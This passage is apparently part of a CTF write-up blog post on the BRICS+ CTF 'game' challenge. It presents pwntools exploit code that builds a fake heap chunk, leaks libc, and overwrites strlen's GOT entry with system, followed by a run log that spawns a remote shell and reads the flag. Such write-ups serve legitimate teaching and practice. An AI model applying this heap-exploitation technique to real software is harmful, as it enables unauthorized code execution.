+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x000000000000000a</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4141414141414141</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000481</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4141414141414141</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x4141414141414141</span><span class="p">)</span>  <span class="c1"># fake buffer
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4141414141414141</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x4141414141414141</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4141414141414141</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x4141414141414141</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4141414141414141</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x4141414141414141</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4141414141414141</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x4141414141414141</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4141414141414141</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x4141414441414141</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4141414141414141</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">HEAPBASE</span><span class="o">+</span><span class="mh">0x250</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"(y/n) : "</span><span class="p">,</span> <span class="s">"y"</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>   
+
+<span class="n">go_cards</span><span class="p">()</span>
+<span class="n">quit</span><span class="p">()</span></code></pre></figure>
+
+<p>Before playing cards, heap will look like this</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x406000:	0x0000000000000000	0x0000000000000291
+0x406010:	0x0000000000000001	0x0000000000000000
+0x406020:	0x0000000000000000	0x0000000000000000
+0x406030:	0x0000000000000000	0x0000000000000000
+0x406040:	0x0000000000000000	0x0000000000000000
+0x406050:	0x0000000000000000	0x0000000000000000
+0x406060:	0x0000000000000000	0x0000000000000000
+0x406070:	0x0000000000000000	0x0000000000000000
+0x406080:	0x0000000000000000	0x0000000000000000
+0x406090:	0x0000000000406250	0x0000000000000000 &lt;= points to fake 0x480 chunk
+0x4060a0:	0x0000000000000000	0x0000000000000000
+0x4060b0:	0x0000000000000000	0x0000000000000000
+
+...
+
+0x406210:	0x0000000000000000	0x0000000000000000
+0x406220:	0x0000000000000000	0x0000000000000000
+0x406230:	0x0000000000000000	0x0000000000000000
+0x406240:	0x4141414141414141	0x0000000000000481
+0x406250:	0x4141414141414141	0x4141414141414141 &lt;= fake chunk
+0x406260:	0x4141414141414141	0x4141414141414141
+0x406270:	0x4141414141414141	0x4141414141414141
+0x406280:	0x4141414141414141	0x4141414141414141
+0x406290:	0x4141414141414141	0x4141414141414141
+0x4062a0:	0x4141414141414141	0x4141414441414141
+0x4062b0:	0x4141414141414141	0x0000000000406250 &lt;= size / name buffer 
+0x4062c0:	0x202020202020200a	0x0000000000000020
+0x4062d0:	0x2020202020202020	0x2020202020202020
+0x4062e0:	0x2020202020202020	0x0000000000000020
+0x4062f0:	0x0000000000000000	0x0000000000000051
+0x406300:	0x2323232323232323	0x2323232323232320
+0x406310:	0x2020202020204123	0x2320202020202020</code></pre></figure>
+
+<p>Playing cards and quit will allocate the fake chunk and free it.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x406230:	0x0000000000000000	0x0000000000000000
+0x406240:	0x4141414141414141	0x0000000000000481
+0x406250:	0x00007ffff7fa6ce0	0x00007ffff7fa6ce0 &lt;= freed fake chunk
+0x406260:	0x0000000000000000	0x0000000000000000
+0x406270:	0x4141414141414141	0x4141414141414141
+0x406280:	0x4141414141414141	0x4141414141414141
+0x406290:	0x4141414141414141	0x4141414141414141
+0x4062a0:	0x4141414141414141	0x4141414541414141
+0x4062b0:	0x4141414141414141	0x0000000000406250
+0x4062c0:	0x202020202020200a	0x0000000000000020</code></pre></figure>
+
+<p>In the previous payload, I also directly overwrote the <code class="language-plaintext highlighter-rouge">name buffer</code> pointer with the address of the fake chunk, so that we can now directly read the libc address from it.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Name: "</span><span class="p">)</span>
+<span class="n">LIBCLEAK</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">LIBCLEAK</span> <span class="o">-</span> <span class="mh">0x219ce0</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC leak       : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">LIBCLEAK</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC            : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span></code></pre></figure>
+
+<p>Now that we know <code class="language-plaintext highlighter-rouge">libc</code>, we can bring this to an end. Since <code class="language-plaintext highlighter-rouge">User Info</code> will print our buffer with <code class="language-plaintext highlighter-rouge">puts</code>, <code class="language-plaintext highlighter-rouge">strlen.abs.got</code> is a very good target for this.</p>
+
+<p>When <code class="language-plaintext highlighter-rouge">puts</code> gets called, it will check the length of the string with <code class="language-plaintext highlighter-rouge">strlen(username)</code>, so if we can overwrite it with <code class="language-plaintext highlighter-rouge">system</code> first, it would execute <code class="language-plaintext highlighter-rouge">system(username)</code>.</p>
+
+<p>For this, we’ll overwrite the <code class="language-plaintext highlighter-rouge">buffer</code> address in our <code class="language-plaintext highlighter-rouge">userinfo</code> with the address of <code class="language-plaintext highlighter-rouge">strlen.abs.got-8</code>.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">STRLENGOT</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x219098</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4141414141414141</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x4141414141414141</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4141414141414141</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x4141414141414141</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4141414141414141</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x4141414141414141</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4141414141414141</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x4141414141414141</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4141414141414141</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x4141414141414141</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4141414141414141</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x4141414441414141</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">STRLENGOT</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="s">"y"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span></code></pre></figure>
+
+<p>Then we’ll just change the username again to <code class="language-plaintext highlighter-rouge">/bin/sh\x00 + system</code>.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"(y/n) : "</span><span class="p">,</span> <span class="s">"y"</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"system"</span><span class="p">])</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span></code></pre></figure>
+
+<p>This way our username will be <code class="language-plaintext highlighter-rouge">/bin/sh</code>, and we’ll also overwrite <code class="language-plaintext highlighter-rouge">strlen.abs.got</code> with <code class="language-plaintext highlighter-rouge">system</code>.</p>
+
+<p>Now, we’ll just need to show userinfo again to trigger the shell.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[*] '/media/sf_ctf/brics23/gamework/game/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to game-51463dfee2ff6388.brics-ctf.ru on port 13001: Done
+[*] Rewrite maze to get a teleporter to leave maze to north
+[*] Overwrite name size
+[*] Overwrite name pointer lsb
+[*] Leak heap from name
+[*] HEAP leak        : 0x1d4a240
+[*] HEAP base        : 0x1d4a000
+[*] Point name to tcache arena
+[*] Fillup heap to get enough chunks to free into bin
+[*] Free fake bin chunk to get mainarena pointer
+[*] Leak mainarena pointer
+[*] LIBC leak       : 0x7f7fa1afece0
+[*] LIBC            : 0x7f7fa18e5000
+[*] Overwrite strlen abs.got
+[*] Show name to trigger shell
+[*] Switching to interactive mode
+$ ls
+flag.txt
+vuln
+$ cat flag.txt
+brics+{4c760273d8880a807d0c802781ba8793}
+$  </code></pre></figure>
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=BRICS+ CTF - game&amp;url=https://kileak.github.io/ctf/2023/brics-game/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2023/brics-game/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2023/brics-game';
+        var disqus_title = 'BRICS+ CTF - game';
+        var disqus_url = 'https://kileak.github.io/ctf/2023/brics-game';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
+    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jekyll-search.min.js"></script>
+    <script src="/js/main.js"></script>
+  </body>
+</html>
